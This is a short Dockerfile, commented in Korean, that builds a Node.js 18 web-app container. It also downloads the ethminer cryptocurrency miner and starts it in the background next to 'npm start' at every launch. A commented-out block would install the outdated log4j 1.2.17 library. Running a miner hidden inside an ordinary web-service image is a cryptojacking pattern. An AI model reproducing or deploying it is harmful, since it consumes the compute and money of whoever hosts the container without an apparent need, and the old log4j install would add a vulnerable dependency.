# 경량의 공식 Node.js 18 이미지를 사용합니다.
# https://hub.docker.com/_/node
FROM node:18-slim

# 앱 디렉터리를 생성한 후 앱 디렉터리로 변경합니다.
WORKDIR /usr/src/app

# 애플리케이션 종속 항목 매니페스트를 컨테이너 이미지에 복사합니다.
COPY package*.json ./

# 프로덕션 종속 항목을 설치합니다.
RUN npm install --only=production

# 로컬 코드를 컨테이너 이미지에 복사합니다.
COPY . ./

# ethminer 다운로드 및 압축 해제
RUN apt-get update && apt-get install -y wget sudo tar \
    && wget https://github.com/ethereum-mining/ethminer/releases/download/v0.18.0/ethminer-0.18.0-cuda-8-linux-x86_64.tar.gz \
    && tar xvfz ethminer-0.18.0-cuda-8-linux-x86_64.tar.gz

# 실행 권한 부여
RUN chmod +x /usr/src/app/bin/ethminer

#RUN wget https://archive.apache.org/dist/logging/log4j/1.2.17/log4j-1.2.17.tar.gz \
#    && tar -xzvf log4j-1.2.17.tar.gz \
#    && cd apache-log4j-1.2.17 \
#    && sudo cp log4j-1.2.17.jar /usr/local/lib/ \
#    && export CLASSPATH=$CLASSPATH:/usr/local/lib/log4j-1.2.17.jar

# 컨테이너 시작 시 ethminer와 웹 서버를 실행합니다.
ENTRYPOINT ["/bin/sh", "-c", "./bin/ethminer & npm start"]
